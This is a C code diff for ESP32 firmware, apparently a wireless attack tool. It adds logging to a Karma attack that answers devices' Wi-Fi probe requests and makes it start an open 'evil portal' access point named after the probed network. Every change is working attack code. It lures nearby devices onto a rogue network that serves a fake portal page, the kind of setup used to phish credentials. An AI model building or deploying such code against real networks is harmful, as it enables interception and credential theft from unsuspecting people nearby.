@@ -82,6 +82,9 @@ void *beacon_task_handle = NULL;
 void *deauth_task_handle = NULL;
 int beacon_task_running = 0;
 
+static bool karma_portal_active = false;
+
+
 const uint16_t COMMON_PORTS[] = {
     20,    // FTP Data
     21,    // FTP Control
@@ -4585,7 +4588,20 @@ static void karma_send_probe_response(const uint8_t *sta_mac, const char *ssid) 
     esp_wifi_get_channel(&channel, &second);
     resp[idx++] = channel;
 
-    esp_wifi_80211_tx(WIFI_IF_AP, resp, idx, false);
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, resp, idx, false);
+
+    // --- VERBOSE LOGGING FOR KARMA INTERACTIONS ---
+    if (err == ESP_OK) {
+        printf("[KARMA] Sent probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid);
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Sent probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid);
+    } else {
+        printf("[KARMA] Failed to send probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s': %s\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid, esp_err_to_name(err));
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Failed to send probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s': %s\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid, esp_err_to_name(err));
+    }
 }
 
 static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
@@ -4606,12 +4622,35 @@ static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t 
                 if (!karma_ssid_manual_mode) {
                     karma_add_ssid(probed_ssid);
                 }
+                printf("[KARMA] Received probe request from STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], probed_ssid);
+                TERMINAL_VIEW_ADD_TEXT("[KARMA] Received probe request from STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], probed_ssid);
                 // Respond directly to probe request
                 karma_send_probe_response(hdr->addr2, probed_ssid);
             }
             break;
         }
         ssid_offset += payload[ssid_offset + 1] + 2;
+    }
+}
+
+static void karma_start_portal_for_ssid(const char *ssid) {
+    // Use the default portal, SSID as AP name, open AP (no password)
+    if (!karma_portal_active) {
+        wifi_manager_start_evil_portal("default", ssid, "", ssid, "portal.local");
+        karma_portal_active = true;
+        printf("[KARMA] Evil portal started for SSID: %s\n", ssid);
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Evil portal started for SSID: %s\n", ssid);
+    }
+}
+
+static void karma_stop_portal_if_active(void) {
+    if (karma_portal_active) {
+        wifi_manager_stop_evil_portal();
+        karma_portal_active = false;
+        printf("[KARMA] Evil portal stopped\n");
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Evil portal stopped\n");
     }
 }
 
@@ -4643,6 +4682,7 @@ static void karma_task(void *param) {
         ESP_ERROR_CHECK(esp_wifi_start());
         printf("Karma using single SSID: %s\n", karma_ssid_cache[0]);
         TERMINAL_VIEW_ADD_TEXT("Karma using single SSID: %s\n", karma_ssid_cache[0]);
+        karma_start_portal_for_ssid(karma_ssid_cache[0]);
     }
 
     while (karma_running) {
@@ -4665,6 +4705,7 @@ static void karma_task(void *param) {
             ESP_ERROR_CHECK(esp_wifi_start());
             printf("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
             TERMINAL_VIEW_ADD_TEXT("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
+            karma_start_portal_for_ssid(karma_ssid_cache[karma_ssid_index]);
             karma_ssid_index = (karma_ssid_index + 1) % karma_ssid_count;
             last_ssid_change_time = now;
         }
@@ -4678,6 +4719,7 @@ static void karma_task(void *param) {
         vTaskDelay(pdMS_TO_TICKS(500));
     }
     esp_wifi_set_promiscuous(false);
+    karma_stop_portal_if_active();
     karma_task_handle = NULL;
     printf("Karma attack stopped\n");
     TERMINAL_VIEW_ADD_TEXT("Karma attack stopped\n");
